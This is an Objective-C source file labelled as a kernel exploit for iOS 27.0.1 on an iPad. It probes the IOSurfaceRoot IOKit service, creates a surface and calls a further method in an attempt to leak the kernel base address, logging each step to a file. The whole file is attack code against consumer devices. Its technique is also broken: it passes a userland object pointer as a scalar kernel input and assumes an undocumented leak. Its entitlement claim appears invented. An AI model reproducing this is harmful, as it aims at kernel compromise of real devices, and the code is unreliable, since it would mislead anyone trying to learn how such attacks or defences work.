// kernel_rw.m
// iOS 27.0.1 Kernel Exploit with File Logging
// Target: iPad A16 (iPad15,8), iOS 27.0.1 (24A446)

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <stdio.h>

// MARK: - Logging

static FILE *g_log = NULL;

void log_msg(const char *fmt, ...) {
    if (!g_log) return;
    
    va_list args;
    va_start(args, fmt);
    vfprintf(g_log, fmt, args);
    va_end(args);
    fflush(g_log);
}

// MARK: - Main

int main(int argc, char *argv[]) {
    @autoreleasepool {
        // Open log file in Documents directory
        NSString *docsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *logPath = [docsPath stringByAppendingPathComponent:@"exploit.log"];
        
        g_log = fopen([logPath UTF8String], "w");
        
        log_msg("=== iOS 27.0.1 Kernel Exploit ===\n");
        log_msg("[*] Starting...\n");
        log_msg("[*] Log file: %s\n", [logPath UTF8String]);
        
        // Step 1: Get IOSurface service
        log_msg("[*] Step 1: Getting IOSurface service...\n");
        
        io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
            IOServiceMatching("IOSurfaceRoot"));
        
        if (!service) {
            log_msg("[-] FAILED: Could not find IOSurfaceRoot\n");
            log_msg("[-] Reason: IOKit access blocked by sandbox/entitlements\n");
            log_msg("[-] Need: com.apple.private.iokit.allow entitlement\n");
            if (g_log) fclose(g_log);
            return -1;
        }
        log_msg("[+] Found IOSurfaceRoot service\n");
        
        // Step 2: Open connection
        log_msg("[*] Step 2: Opening IOSurface connection...\n");
        
        io_connect_t connect = 0;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
        
        if (kr != KERN_SUCCESS) {
            log_msg("[-] FAILED: IOServiceOpen returned 0x%x\n", kr);
            log_msg("[-] Reason: Insufficient permissions\n");
            IOObjectRelease(service);
            if (g_log) fclose(g_log);
            return -1;
        }
        log_msg("[+] Opened connection: %d\n", connect);
        
        // Step 3: Create test surface
        log_msg("[*] Step 3: Creating test IOSurface...\n");
        
        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfacePixelFormat": @(0x42475241),  // 'BGRA'
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfaceBytesPerRow": @256,
            @"IOSurfaceAllocSize": @16384
        };
        
        uint64_t input[3] = {0};
        input[0] = (uint64_t)(__bridge void *)props;
        uint64_t output[1] = {0};
        uint32_t outputCnt = 1;
        
        kr = IOConnectCallMethod(connect, 0, input, 3, NULL, 0, 
                                 output, &outputCnt, NULL, NULL);
        
        if (kr == KERN_SUCCESS) {
            log_msg("[+] Created surface: ID=%u\n", (uint32_t)output[0]);
        } else {
            log_msg("[-] FAILED: Create surface returned 0x%x\n", kr);
        }
        
        // Step 4: Try to get surface address (kernel info leak)
        log_msg("[*] Step 4: Attempting kernel info leak...\n");
        
        uint64_t input2[1] = {output[0]};
        uint64_t output2[2] = {0};
        uint32_t outputCnt2 = 2;
        
        kr = IOConnectCallMethod(connect, 11, input2, 1, NULL, 0,
                                 output2, &outputCnt2, NULL, NULL);
        
        if (kr == KERN_SUCCESS) {
            log_msg("[+] Surface address: 0x%llx\n", output2[0]);
            log_msg("[+] Kernel base leak: 0x%llx\n", output2[1]);
        } else {
            log_msg("[-] Get address failed: 0x%x\n", kr);
        }
        
        // Cleanup
        log_msg("[*] Cleaning up...\n");
        IOServiceClose(connect);
        IOObjectRelease(service);
        
        log_msg("[*] Exploit test complete\n");
        log_msg("[*] Check if we reached this point = no crash\n");
        
        if (g_log) fclose(g_log);
        return 0;
    }
}
